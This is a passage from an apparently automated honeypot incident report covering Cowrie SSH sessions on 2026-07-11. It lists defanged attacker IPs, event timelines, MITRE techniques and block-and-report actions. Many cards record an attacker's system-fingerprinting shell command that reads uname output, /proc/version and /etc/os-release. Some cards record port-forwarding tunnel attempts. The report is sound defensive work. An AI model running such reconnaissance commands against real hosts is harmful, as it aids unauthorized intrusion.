| `2026-07-11 07:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.90.13[.]168` to AbuseIPDB if not already reported
- [ ] Block `95.90.13[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec31b859eba

| Field | Detail |
|---|---|
| **Source IP** | `95.90.13[.]168` |
| **First Seen** | 2026-07-11 07:52 |
| **Last Seen** | 2026-07-11 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:52:23` | `cowrie.session.connect` |
| `2026-07-11 07:52:23` | `cowrie.client.version` |
| `2026-07-11 07:52:23` | `cowrie.client.kex` |
| `2026-07-11 07:52:23` | `cowrie.login.success` |
| `2026-07-11 07:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.90.13[.]168` to AbuseIPDB if not already reported
- [ ] Block `95.90.13[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3066a4fa5852

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:53 |
| **Last Seen** | 2026-07-11 07:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:53:44` | `cowrie.session.connect` |
| `2026-07-11 07:53:45` | `cowrie.client.version` |
| `2026-07-11 07:53:45` | `cowrie.client.kex` |
| `2026-07-11 07:53:46` | `cowrie.login.success` |
| `2026-07-11 07:53:48` | `cowrie.session.params` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.success` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.command.input` |
| `2026-07-11 07:53:48` | `cowrie.log.closed` |
| `2026-07-11 07:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5539e2ae4a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:55 |
| **Last Seen** | 2026-07-11 07:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:55:21` | `cowrie.session.connect` |
| `2026-07-11 07:55:21` | `cowrie.client.version` |
| `2026-07-11 07:55:21` | `cowrie.client.kex` |
| `2026-07-11 07:55:23` | `cowrie.login.success` |
| `2026-07-11 07:55:24` | `cowrie.session.params` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.success` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:24` | `cowrie.command.input` |
| `2026-07-11 07:55:25` | `cowrie.log.closed` |
| `2026-07-11 07:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120601a38291

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:56 |
| **Last Seen** | 2026-07-11 07:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:56:55` | `cowrie.session.connect` |
| `2026-07-11 07:56:56` | `cowrie.client.version` |
| `2026-07-11 07:56:56` | `cowrie.client.kex` |
| `2026-07-11 07:56:58` | `cowrie.login.success` |
| `2026-07-11 07:56:59` | `cowrie.session.params` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.success` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:56:59` | `cowrie.command.input` |
| `2026-07-11 07:57:00` | `cowrie.log.closed` |
| `2026-07-11 07:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff5076856948

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:58 |
| **Last Seen** | 2026-07-11 07:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:58:32` | `cowrie.session.connect` |
| `2026-07-11 07:58:33` | `cowrie.client.version` |
| `2026-07-11 07:58:33` | `cowrie.client.kex` |
| `2026-07-11 07:58:34` | `cowrie.login.success` |
| `2026-07-11 07:58:36` | `cowrie.session.params` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.success` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.command.input` |
| `2026-07-11 07:58:36` | `cowrie.log.closed` |
| `2026-07-11 07:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64f72135681

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-11 07:59 |
| **Last Seen** | 2026-07-11 07:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:59:36` | `cowrie.session.connect` |
| `2026-07-11 07:59:37` | `cowrie.client.version` |
| `2026-07-11 07:59:37` | `cowrie.client.kex` |
| `2026-07-11 07:59:40` | `cowrie.login.success` |
| `2026-07-11 07:59:41` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25c08dca4682

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:00 |
| **Last Seen** | 2026-07-11 08:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:00:03` | `cowrie.session.connect` |
| `2026-07-11 08:00:03` | `cowrie.client.version` |
| `2026-07-11 08:00:03` | `cowrie.client.kex` |
| `2026-07-11 08:00:05` | `cowrie.login.success` |
| `2026-07-11 08:00:06` | `cowrie.session.params` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.success` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:06` | `cowrie.command.input` |
| `2026-07-11 08:00:07` | `cowrie.log.closed` |
| `2026-07-11 08:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc333361ae32

| Field | Detail |
|---|---|
| **Source IP** | `35.195.204[.]234` |
| **First Seen** | 2026-07-11 08:00 |
| **Last Seen** | 2026-07-11 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:00:42` | `cowrie.session.connect` |
| `2026-07-11 08:00:42` | `cowrie.login.success` |
| `2026-07-11 08:00:42` | `cowrie.session.params` |
| `2026-07-11 08:00:42` | `cowrie.command.input` |
| `2026-07-11 08:00:42` | `cowrie.command.input` |
| `2026-07-11 08:00:42` | `cowrie.command.failed` |
| `2026-07-11 08:00:42` | `cowrie.command.input` |
| `2026-07-11 08:00:42` | `cowrie.log.closed` |
| `2026-07-11 08:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.204[.]234` to AbuseIPDB if not already reported
- [ ] Block `35.195.204[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc176a6cba19

| Field | Detail |
|---|---|
| **Source IP** | `35.195.204[.]234` |
| **First Seen** | 2026-07-11 08:00 |
| **Last Seen** | 2026-07-11 08:01 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:00:55` | `cowrie.session.connect` |
| `2026-07-11 08:00:55` | `cowrie.login.success` |
| `2026-07-11 08:00:56` | `cowrie.session.params` |
| `2026-07-11 08:00:56` | `cowrie.command.input` |
| `2026-07-11 08:00:56` | `cowrie.command.failed` |
| `2026-07-11 08:01:15` | `cowrie.log.closed` |
| `2026-07-11 08:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.204[.]234` to AbuseIPDB if not already reported
- [ ] Block `35.195.204[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85459fcf3f01

| Field | Detail |
|---|---|
| **Source IP** | `35.195.204[.]234` |
| **First Seen** | 2026-07-11 08:00 |
| **Last Seen** | 2026-07-11 08:01 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:00:57` | `cowrie.session.connect` |
| `2026-07-11 08:00:57` | `cowrie.login.success` |
| `2026-07-11 08:00:58` | `cowrie.session.params` |
| `2026-07-11 08:00:58` | `cowrie.command.input` |
| `2026-07-11 08:01:15` | `cowrie.log.closed` |
| `2026-07-11 08:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.204[.]234` to AbuseIPDB if not already reported
- [ ] Block `35.195.204[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16570c03aeaa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:01 |
| **Last Seen** | 2026-07-11 08:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:01:33` | `cowrie.session.connect` |
| `2026-07-11 08:01:33` | `cowrie.client.version` |
| `2026-07-11 08:01:33` | `cowrie.client.kex` |
| `2026-07-11 08:01:35` | `cowrie.login.success` |
| `2026-07-11 08:01:36` | `cowrie.session.params` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.success` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.command.input` |
| `2026-07-11 08:01:36` | `cowrie.log.closed` |
| `2026-07-11 08:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6308c85318f0

| Field | Detail |
|---|---|
| **Source IP** | `78.25.127[.]202` |
| **First Seen** | 2026-07-11 08:02 |
| **Last Seen** | 2026-07-11 08:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:02:17` | `cowrie.session.connect` |
| `2026-07-11 08:02:18` | `cowrie.client.version` |
| `2026-07-11 08:02:18` | `cowrie.client.kex` |
| `2026-07-11 08:02:19` | `cowrie.login.success` |
| `2026-07-11 08:02:20` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.25.127[.]202` to AbuseIPDB if not already reported
- [ ] Block `78.25.127[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-491fec8d2ac9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 08:02 |
| **Last Seen** | 2026-07-11 08:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:02:51` | `cowrie.session.connect` |
| `2026-07-11 08:02:51` | `cowrie.client.version` |
| `2026-07-11 08:02:51` | `cowrie.client.kex` |
| `2026-07-11 08:02:52` | `cowrie.login.success` |
| `2026-07-11 08:02:53` | `cowrie.session.params` |
| `2026-07-11 08:02:53` | `cowrie.command.input` |
| `2026-07-11 08:02:54` | `cowrie.log.closed` |
| `2026-07-11 08:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811383a228de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:03 |
| **Last Seen** | 2026-07-11 08:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:03:02` | `cowrie.session.connect` |
| `2026-07-11 08:03:02` | `cowrie.client.version` |
| `2026-07-11 08:03:02` | `cowrie.client.kex` |
| `2026-07-11 08:03:04` | `cowrie.login.success` |
| `2026-07-11 08:03:06` | `cowrie.session.params` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.success` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.command.input` |
| `2026-07-11 08:03:06` | `cowrie.log.closed` |
| `2026-07-11 08:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca88e737113

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-07-11 08:03 |
| **Last Seen** | 2026-07-11 08:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:03:43` | `cowrie.session.connect` |
| `2026-07-11 08:03:44` | `cowrie.client.version` |
| `2026-07-11 08:03:44` | `cowrie.client.kex` |
| `2026-07-11 08:03:46` | `cowrie.login.success` |
| `2026-07-11 08:03:47` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da59df18f1f

| Field | Detail |
|---|---|
| **Source IP** | `218.103.120[.]150` |
| **First Seen** | 2026-07-11 08:03 |
| **Last Seen** | 2026-07-11 08:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:03:53` | `cowrie.session.connect` |
| `2026-07-11 08:03:55` | `cowrie.client.version` |
| `2026-07-11 08:03:55` | `cowrie.client.kex` |
| `2026-07-11 08:03:58` | `cowrie.login.success` |
| `2026-07-11 08:03:58` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.103.120[.]150` to AbuseIPDB if not already reported
- [ ] Block `218.103.120[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc50e44f407

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:04 |
| **Last Seen** | 2026-07-11 08:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:04:30` | `cowrie.session.connect` |
| `2026-07-11 08:04:30` | `cowrie.client.version` |
| `2026-07-11 08:04:30` | `cowrie.client.kex` |
| `2026-07-11 08:04:32` | `cowrie.login.success` |
| `2026-07-11 08:04:34` | `cowrie.session.params` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.success` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.command.input` |
| `2026-07-11 08:04:34` | `cowrie.log.closed` |
| `2026-07-11 08:04:35` | `cowrie.session.closed` |

